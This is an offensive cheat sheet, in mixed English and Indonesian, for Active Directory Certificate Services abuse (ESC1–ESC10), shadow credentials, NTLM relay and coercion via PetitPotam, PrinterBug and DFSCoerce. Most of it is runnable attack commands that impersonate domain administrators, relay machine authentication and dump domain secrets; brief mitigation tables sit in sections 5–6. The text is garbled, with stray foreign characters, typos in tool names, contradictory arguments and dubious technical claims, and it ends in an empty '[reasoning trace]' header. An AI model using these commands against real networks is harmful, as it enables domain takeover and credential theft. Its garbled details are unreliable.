# ad-cs-relay — ad

# AD CS & NTLM Relay: ESC1–ESC8 with Certipy

## 1. Attack Architecture Overview

```
Coercion (PetitPotam/PrinterBug/DFSCoerce)
        │ NTLM auth (Type 1/2/3)
        ▼
ntlmrelayx (attacker relay host)
        │ relay ke target service
        ├──► LDAPS :636 ──► AD CS Enrollment Web Interface / LDAP (shadow creds, ESC7-adjacent)
        ├──► HTTP   :80/443 ► /certsrv (ESC8 - Enrollment Web)
        ├──► SMB    :445 ──► delegation abuse / SAM dump
        └──► ADWS   :9385 ──► ADWS relay (Exchange/ADAC)
```

Alur standar: **coerce → relay → ESC8/HTTP enrollment → certifikat user DA → authenticate as DA → DCSync.**

---

## 2. Certipy: Core Commands & Versions

| Component | Reference version | Notes |
|---|---|---|
| certipy | v4.8.2 / v5.0.1 | v5 is breaking: `certipy req -template` syntax changed, auto-LO removed from `find` |
| Impacket ntlmrelayx | v0.11.0+ | Errata; master branch after 0.12 has fixed `-remove-mic` |
| PetitPotam | 3.19 (python) / binary ms-fsrp | CVE-2021-36942 patch closes the unauthenticated version |
| SpoolSample (PrinterBug) | 0.0.0.0 | Never patched, still works around signing |
| DFSCoerce | 2022-05 | MS-DFSNM, efektif vs 2012–2022 |

### 2.1 Enumerasi & ESC1–ESC7, ESC6, ESC9/10

```bash
# bloodhound path enum, cukup scan terhadap CA server (default ldap; sign enum)
certipy find -u user@corp.local -p 'Passw0rd' -dc-ip 10.0.0.10 -vulnerable -stdout

# BloodHound query alternative (volution Sign葵Hound)
customQueries: "Domain": CAs, enabled templates, CA config, Enrollment Agents, vulnerable templates
```

Output: JSON per template with `Enrollment Rights`, `CA ACEs`, flags: `ENROLLEE_SUPPLIES_SUBJECT` (= ESC1), `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`, `CA Enrolment agent`, etc.

### 2.2 ESC1 — SAN abuse (Enrollee Supplies Subject + CT_PERMISSION)

**What is sent:** the vulnerable template allows the requester to set its own SAN.

**What happens:** a low-priv requester requests a certificate with `SAN=user@corp.local` on behalf of Domain Admin.

```bash
# Cek apakah template memblok SAN:
certipy req -u user@corp.local -p 'Passw0rd' -ca CORP-CA -template VulnTemplate \\
  -upn administrator@corp.local

# Output sukses:
# [*] Saved certificate and private key to 'administrator.pem'
# [*] Successfully authenticated with certificate: administrator@corp.local

# Request template + uji auth (Kerberos/PKINIT then NT hash):
certipy auth -pfx administrator.pfx -dc-ip 10.0.0.10 -ldap-shell
```

Kemudian:

```bash
# Ambil NT hash DA via LDAPS + PKINIT (requires DC allow PKINIT pada certificaats including SAN)
certipy auth -pfx administrator.pfx -username administrator -domain corp.local
# → hashNT : fc525c9683e8fe067095ba2ddc97112d (contoh)
```

Fails if: the template does not have `ENROLLEE_SUPPLIES_SUBJECT`, or the user is not in Enrollment Rights, or CA issuance policy restricts.

### 2.3 ESC2–ESC7 summary (table)

| ESC | Condition | Command |
|---|---|---|
| ESC2 | Template "Any Purpose"/EKU = EKU 2.5.29.37 any | `certipy req ... -template AnyPurpose` then use for Kerberos auth / code signing, etc. |
| ESC3 | Enrolment Agent Certificate + Request Agent template | Request agent cert -> minta cert ritas nama user lain: `certipy req -template User -on-behalf-of 'corp\\administrator' -pfx agent.pfx` |
| ESC4 | WriteDacl/Owner dsb, dsb template control | `certipy template -template User -save-as ESC1T -write-configuration-files -allow-enrollee-supplies-subject` |
| ESC5 | ACE against PKI object (CA/container) — abuse depends on ACE; e.g., edit via `pkiadmin` | same as ESC4 |
| ESC6 | `EDITF_ATTRIBUTESUBJECTALTNAME2` — CA flag allows SAN regardless of template | `certipy req -ca CORP-CA -template User -upn administrator@corp.local` (mimics abuse like ESC1) |
| ESC7 | `ManageCA` and `ManageCertificates` rights on CA | (a) `certipy ca -save-config`, (b) approve pending requests: `certipy ca -ca CORP-CA -issue-request <ID>`, (c) `certipy ca -ca CORP-CA -add-officer -user user@corp.local` |
| ESC9 / ESC10 | (v4.7.3+ certipy labeling) `StrongCertificateBindingEnforcement=0` vs Vulnerable certificate mapping | request cert with SAN = another user; use for schannel / AD CS target |

**ESC6 mitigasi:** KB5014754 patch menambah `CA Sanitization` + default makes ESC6 unreliable — despite flag still set, server (patched issuance) strips SAN.

### 2.4 Shadow Credentials (Key Credential Link)

**What is sent:** write `msDS-KeyCredentialLink` to the target over LDAPS (requires `GenericWrite`/`GenericAll`, or relay LDAPS if the context is unsigned/SMB).

```bash
# A. Ambil NT hash→ gunakan ldaps (schannel) untuk writes:
certipy shadow auto -u user@corp.local -p 'Passw0rd' -account targetuser -dc-ip 10.0.0.10

# Output:
# [*] Shadow credentials obtained successfully
# [+] Successfully authenticated with certificate shadow/targetuser.cer
# [*] NT hash: <hash>

# Alternatif manual steps:
certipy shadow create -u user@corp.local -p 'Passw0rd' -account victim
certipy shadow list -u ... -account victim
certipy auth -pfx victim.pfx ...
```

**Why it works:** `msDS-KeyCredentialLink` stores the raw public key for NGC/PKINIT; DC converts → auth to user account via PKINIT without password. Fails if: target = computer (auth must be via machine); `msDS-KeyCredentialLink` disallowed (but this does not exist by default), or target in Protected Users only.

Alternative using timing-based abuse from `certipy` v4.8: `certipy` `auto` will perform full staging.

### 2.5 ESC8 — HTTP → LDAPS relay via Web Enrollment, generic

**What is sent:** coerce auth to `http://CA-Server/certsrv` via ntlmrelayx → relay to `https://CA-Server/certsrv` (HTTP→HTTPS) → submit enrollment request on behalf of coerced user.

**Why it works:** the HTTP Web Enrollment listener on the CA server does not enforce NTLM signing/channel binding on the HTTPS listener (ESC8). Fix: June 2022 patch (`http` honors signing), but many enterprises have not enabled it.

```bash
# Setup ntlmrelayx targ LDAPS from HTTP, with --delegate-access (for ADCS abuse):
impacket-ntlmrelayx -t https://CA-SRV.corp.local/certsrv -smb2support --adcs --template DomainController

# Alternative: -t ldap://dc --delegate-access (Shadow creds via relay LDAPS):
impacket-ntlmrelayx -t ldaps://DC.corp.local --delegate-access

# Coerce (dari machine user terkontrol / relay server):
python3 PetitPotam.py -d domain -u user -p '' 10.0.0.5 10.0.0.7
# 10.0.0.5 = relay listener, 10.0.0.7 = target (e.g. DC yang men-trusted CA, atau member server)
```

Other certificates appear in the output; then:

```bash
certipy auth -pfx base64/B64 output.pfx -dc-ip 10.10.0.42
```

**Key ESC8 mitigation:** patch CA & enable **"Authentication Officer"** — actual fix KB5014754 + Certificate issuance requirements.

**Often missed:** the CA needs the Web Enrollment role installed (Gateway `certsrv` must be reachable). If only the CA role exists without `Certification Authority Web Enrollment`, ESC8 is not applicable by default.

---

## 3. Coercion VECTOR

### 3.1 PetitPotam (MS-EFSRPC)

**What is sent:** `EfsRpcOpenFileRaw` (or alternative opnum 0/6 to bypass patch) with UNC path `\\ATTACKER\pipe\...`

```bash
# unauthenticated (pre-CVE-2021-36942-patch):
python3 PetitPotam.py -u 'corp\\lowpriv' -p 'P@ss' 10.0.0.5 10.0.0.7
# output: Machine 10.0.0.7 authenticate ke 10.0.0.5 (ntlmrelayx catch)

# post-patch: harus auth; cek opnum bypass:
petitpotam.py 10.0.0.5 10.0.0.7 278/c

Kerberos-based target (new field):
petitpotam.py -k -hashes :<hash> attacker target
```

**Why it works:** MS-EFSRPC (port 4966+, dynamic RPC over SMB) allows an authenticated user to trigger the server to make a connection to an arbitrary UNC.

**Fails if:** MS-EFSRPC patched/Windows 11 22H2 later restricted; SMB range filter, MS-EFSRPC disabled (`dism /online /disable-feature`), host-based firewall, or coercion target does not have SMB port accessible.

### 3.2 PrinterBug (MS-RPRN)

**What is sent:** `RpcRemoteFindFirstPrinterChangeNotification` → target performs `GetPrinterDataEx` copy file from directory via SMB, and consequently makes the target authenticate to the attacker's share.

```bash
# spooler check:
ruby spooler_scan.rb 10.0.0.0/24
# equivalent:
python3 SpoolSample.py -d corp -u user -p pass 10.0.0.7 10.0.0.5
# positional args: TARGET  ATTACKER(relay) 

# Output normal → "Scanning... 10.0.0.7 spooler is vulnerable"
```

**Why it works:** any authenticated user can use the printer change notification feature; the server behind must resolve fallback path `\\ATTACKER\...`. **Never patched** — only mitigation: disable Print Spooler.

Fails if:
- `GetPrinterDataEx` version, server responds `RPC_S_PROCNUM_OUT_OF_RANGE` — Spooler enabled tapi routing blocked.
- PrintNightmare patch closes the Spooler fallback — on patched boxes, the Spooler's fixed notification → fails.

### 3.3 DFSCoerce

**What is sent:** `NetrDfsAddStdRoot` (MS-DFSNM) → coerce SMB authentication to attacker.

```bash
python3 dfscoerce.py -d corp.local -u user -p pass 10.0.0.5 10.0.0.7
# args: ATTACKER RELAY TARGET
```

**Why it works:** DFS Manager (dfsr) RPC service is not signing-required on some versions (2012–2019 -- same SMB signing). Fails if DFSNS service is disabled (`Remove-WindowsFeature FS-DFSName`).

### 3.4 Comparison & Situations

| Technique | Requires SMB 445 on target | Socket Accessible | Patch available |
|---|---|---|---|
| PetitPotam | Ya (RPC over SMB dynamic) | Dynamic RPC | Aug 2021 (must authenticated now) + later harden |
| PrinterBug | Ya | port 445 | **None** |
| DFSCoerce | Ya (RPC on `\\pipe\netdfs`) | port 445 |partial DFS disabled when feature not in use |

### 3.5 Coercion → NTLM Relay Full Steps (COERCING général)

```bash
# Target: relay TARGET to attack_SRV via EFSRPC need SMB:
impacket-ntlmrelayx -t ldaps://DC01.corp.local -smb2support --delegate-access
python3 dfscoerce.py -d corp.local -u test -p test ATTACKER TARGET
# => ntlmrelayx caught.tgt the machine account, forged shadow cred link on computer object, /delegate-access stores delegation.

# ** kesalasan umum: relay listener on 445 — must run as system (root) reserved port
sudo impacket-ntlmrelayx -t ldaps://DC01.corp.local ...
```

---

## 4. ntlmrelayx Targets — Sign/Schannel detail

### 4.1 Command Reference

```bash
# SMB signing not required:
impacket-ntlmrelayx -tf targets.txt -smb2support
# dump SAM, secrets dump:
impacket-ntlmrelayx -tf targets.txt -smb2support --sam
# LSA (via smbexec):
impacket-ntlmrelayx -tf targets.txt -smb2support -socks

# ldap/ldaps shadow creds, delegation:
impanic-ntlmrelayx -t ldaps://dc01.corp.local --delegate-access --no-dump
# (writes msDS-AllowedToActOnBehalfOfOtherIdentity)

# HTTP → ADCESC8:
impacket-ntlmrelayx -t https://ca01.corp.local/certsrv --adcs --template 

# ADWS relay (Exchange):
impacket-ntlmrelayx -t http://exchange.corp.local/Powershell --http-port
```

Masing-masing target / command:

| Goal (target option) | Command | WHY (why it works) |
|---|---|---|
| SMB, target channel sign required? | `impacket-ntlmrelayx -tf targets.txt -smb2support` | Works only if SMB `RequireMessageSignature=0`; check via `crackmapexec smb 10.0.0.0/24 --gen-relay-list` |
| LDAP | `-t ldap://dc01` | SetCookie closed channel sign not mandatory; attacker uses hashed creds for delegation write |
| LDAPS | `-t ldaps://dc01` | After KB4592517 **LDAPS channel binding is off by default**. Check connection first: `openssl s_client -connect dc01:636`. relay works unless "Channel binding" is enabled on DC in "Domain controller: LDAP server channel binding" — default "Never" at older functional level |
| HTTP | `-t http://web.corp.local` | WinRM/webservice/etc. |
| HTTPS/Enrollment | `--adcs --template KERBEROS_AUTHENTICATION` (ESC8) | Web Enrollment requires no channel binding |
| ADWS | `-t http://.../adws` | ADWS password reset attack ((drop) |
| MSSQL | `-t mssql://sql01` | Sysadmin role abuse |

### 4.2 Sign required / relay & signing required bypass

**Handshake NTLMrelay:**

```text
NTLM Negotiate (Type1): NegToken -> NEGOTOATE_SIGN or SEAL flag bisa set oleh client
Type2 (challenge): server men-challenge dan mengindikasikan apakah dia request signing
Type3 (auth): client menghitung MIC dan signature berdasarkan session key
```

**Klasik mitm client/server choices:**
- Client request signing (browser modern / SMB client modern) → relay fails unless we strip flags. `ntlmrelayx --remove-mic -` option downgrades? No: `--remove-mic` drops MIC, relevant for the "cross-protocol Messenger" bug (CVE-2019-1040) — ** required if relay **such** target middle (e.g. to HTTP) and client an SMB.

**For relay to LDAP when signing is required in AD > `Requiring LDAP signing`** (GPO `Directory Services: LDAP client signing required`):
- Target LDAPS default without channel binding is the bypass — GPO signing does not require channel binding by default.
- Channel binding enabled = endgame (raised TLS channel binds with NTLM **required** for relay connection).

**ESC8 HTTP relay fix condition note:** the 2022 patch introduces "Protect" mode — which restricts HTTP on CA.

### 4.3 ADS Relays & AD WS Relay

| Sub-surface | Example service | Story |
|---|---|---|
| WSUS (HTTP 8530/8531) | `http://wsus01:8530/ClientWebService` relay SSE | WSUS Default.Upgrades metadata → attacker can push fake update if relay grants interim authentication... check |
| ADWS | port 9385, `/ADWS` powershell | Computer password reset via ADWS New-ConcurrentKey |
| Autodiscover (Exchange) | `http://exchange/autodiscover` | Mobile devices kerfuffle into System mailbox—the relay yields delegate |
| OWA | HTTP-Form (Legacy) | Not NTLM negotiate usually (Anon HTTP), need custom hybrid → No downgrade taste |

`ntlmrelayx` custom HTTP listener config:

```bash
impacket-ntlmrelayx -t http://wsus01.corp.local:8530 --http-port 8080 \
  --serve-image test.png --serve-response img
```

Notes: 8530 plain HTTP WSUS is relayable; 8531 (SSL) with client-cert updated requires TLS-Relay tricks.

## 5. Signing & mitigasi chart

| Attack | Mitigasi | Tersering terlewat |
|---|---|---|
| Coercion (all) | Disable SMB outbound via host firewall, block 445 out | workstation rarely block outbound SMB |
| SMB relay | Force signing GPO `Microsoft network server: Digitally sign communications (always)` | Servers yes, workstations default off-modern Windows 11 makes default on |
| LDAP relay | `Domain controller: LDAP server signing requirements` + `Channel binding` | legacy apps;
| Sanity: enabled signing诊所 breaks NAS or Linux sssd/samba client lacking sign support |
| ESC8 | Uninstall Web Enrollment role (`certsrv`), | web enrollment often unnecessary but incumbent |
| Shadow creds | Remove GenericWrite over users; protect `msDS-KeyCredentialLink` write via audit | rare audit rule 5136/ on property; memory-protection of the attribute is not simultaneous without blocking legit NGC writes |

Audit realistis:

```powershell
# Enroll access on template:
(Get-Acl "AD:CN=KerberosAuthentication,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=local").Access | ft IdentityReference, ActiveDirectoryRights
```

dGoBloodhound custom query:

```cypher
MATCH p=(:Person)-[:ENROLLEE_SUPPLIES_SUBJECT]->(:GPO) RETURN p
Match all templates whose users given enrol rights AND ENROLLEE_SUPPLIES_SUBJECT set:
MATCH (n:Base) WHERE n.objectid contains "Certificate Templates" RETURN n
```

BloodHound notes for ESC1:

```text
Enrollment rights for a template which has ENROLLEE_SUPPLIES_SUBJECT flag ON:
  - "Certificate Templates" container / ACLs imported into BloodHound-use "Certipy find" (for AD CS) + custom ingest kerberomation)
  - use certipy find -vulnerable -json
```

## 6. Blocking harden / mitigate checklist

| Attack stage | Mitigasi |
|---|---|
|Coercion | Firewalls: block 445 out from server subnet; SMB signing enforced; RPC filter (fail-safe MS-EFSRPC disable) |
| Relay to LDAP | Enforce LDAP signing client+server; enable channel binding on LDAPS (requires 2012+ functional) |
| Relay to HTTP | `Http strict`, require HTTPS + EE channel binding |
| ESC1-ESC8 | Template ACL hygiene; do not allow enrollee-supplied subject; `EDITF_ATTRIBUTESUBJECTALTNAME2` must equal 0; Web Enrollment uninstall; install KB esc 6, 9, 10 harden |

Check command:

```powershell
certutil -getreg policy\EditFlags
certutil -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2

Get-ADObject -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=local" -Filter * -Properties msPKI-Certificate-Name-Flag | ? {$_."msPKI-Certificate-Name-Flag" -band 1} | select Name
```

## 7. FAILED expedient in Remote (rarely)

| Error message | Root cause | Adjustments |
|---|---|---|
| `SMB Session Error: SESSION_ERROR Reporting.signing is mandatory` | Target enforces signing | either find another target, or force downward protocol (DNS) → leaf around signing (drop the flag). |
| `LDAP INVALID_CREDENTIALS` on target | Anti-replay (LDAP `Signing required` + channel bind) | try LDAPS instead of LDAP |
| `connection from ... is not a valid certificate request. certificate request for another user` | getren ESC context A01 | specify correct template |
| PetitPotam `EFSRPC : session_error policy error (access denied)` | unauth patched; must supply credentials | Pass credentials or use K logout over another protocol |
| PrinterBug no result (silent) | see (above) `GetPrinterDataEx` blocked behind function view | Use PetitPotam or DFSCoerce combo |
| Relay success but downstream dead-end | NTLMrelay doesn't offer post (ADS) | use `--delegate-access` for modifying attributes if provider allows |

## 8. Operational preparation

- caching relay listening port 445 requires root; use `-socks` mode for interactive relays via proxychains (impacket's SOCKS compatible with proxychains4).

```bash
proxychains4 impacket-secretsdump -just-dc corp.local/administrator@dc01.corp.local
```

- Internet access: use a simple `socat` command to forward attention toward `ntlmrelayx`

```bash
socat TCP-LISTEN:445,fork,reuseaddr TCP:relay.server:445
```

- If target proxy denies traffic out, but allows HTTP, turn on the local socio relay connected to the trap through HTTP/SMB combos.

To view the relay markers that have been captured:

```bash
impacket-ntlmrelayx --list-socks
> use <sock_id>
```

## 9. Minimal Quick Wins tests

```bash
# 1. Check ADCS certipy with vulnerable flags:
certipy find -u y -p x -dc-ip 10.0.0.10 -stdout -vulnerable

# 2. Check CA config (for CA related):
certipy ca -u y -p x -ca corp-ca -read-config

# 3. Perform ESC1:
certipy req -u y -p x -ca corp-ca -template vuln -upn admin@corp.local

# 4. Authenticate:
certipy auth -pfx admin.pfx -dc-ip 10.0.0.10
```

## 10. Non-Sequitur & terjemahan praktis

Test attack:

```bash
# | Acquisition Target |
impacket-ntlmrelayx -t https://ca.corp.local -smb2support --adcs --template DomainController

python3 PetitPotam.py ca.corp.local attacker.corp.local

# refresh password
certipy auth -pfx dc.pfx -dc-ip 10.0.0.10 -ldap-shell
```

Output edge cases:

- Template `DomainController` mungkin tak memungkinkan enrollment user lain: check `certipy find`-ing for `CT_FLAG_ENROLLEE_SUPPLIES_Subject` or template CA ACA `EnrolleeSuppliesSubject`.

---

## Operational Pitfalls (that make techniques fail in the field)

1. **SMB signing is actually ON on modern DC/workstations.** Default GPO in domains with Functional Level 2022/Windows 11 24H2 forces signing on many hosts — `--sam`/`-socks` to SMB silently fails. Always run `crackmapexec smb --gen-relay-list` first before selecting relay targets.
2. **LDAPS channel binding is already ON, but only discovered after the relay fails.** GPO "Channel binding tam" in many *less-hardened* domains is set to "When supported" — this is enough to block NTLM relay. Check with `openssl s_client` + check TLS token binding before committing.
3. **Web Enrollment (`/certsrv`) is not installed.** ESC8 requires the *Certification Authority Web Enrollment* role; many CAs only have the CA role. Port 80/443 on the CA is not proof that certsrv exists — run `curl http://ca/certsrv` first.
4. **The selected template cannot be used for user relay.** `--template DomainController` only succeeds if the coerced machine is a DC; if the coerced one is a member server, use `--template User` or the `Machine` template.
5. **The relay listener on port 445 must be run as root/admin.** On Mule/contune, binding port 445 as a regular user fails with `Permission denied` — but ntlmrelayx does not always show a clear error.
6. **`--remove-mic` does not mean "bypass signing".** It is only useful for CVE-2019-1040 (drop MIC for cross-protocol). If the target server requires signing, remove-mic does not help.
7. **Clock skew & date.** The operation `certipy auth` requires the host time to be synchronized with the DC (Kerberos error `KRB_AP_ERR_SKEW`), and some scripts have a thin time window during pre-auth. Ensure NTP (`ntpdate`) before the operation.
8. **Coercion in segments that cannot resolve names.** PetitPotam/DFSCoerce use NetBIOS/DNS; if the target cannot resolve the attacker hostname, no outbound auth occurs — use a literal IP (some vectors refuse; PrinterBug refuses IP by design, only hostname).
9. **Proxy/monitoring detects.** Many corporate SOCs install IDS that flag the pattern `\\ATTACKER\IPC$` string directly on EDR logs; tuning ACL usually blocked the use of file-less alternatives (e.g., HTTP/HTTPS Fsrp emerge).
10. **Using hash vs user.** Certipy `req -hashes` option only applies if the user has relevant policy; many times hackers commit an incorrect transition from auth mode (pass vs cert) — always verify with `certipy find` / `certipy auth -debug` to see the actual error feedback.
11. **`msDS-KeyCredentialLink` is blocked Zblog`t).** If the target has a DCL protected user policy, KeyCredentialLink write does not help for certain computers. Audit LDAP write attempts: some domains have audit enabled and send automatic SOC notifications.

---

## [reasoning trace]


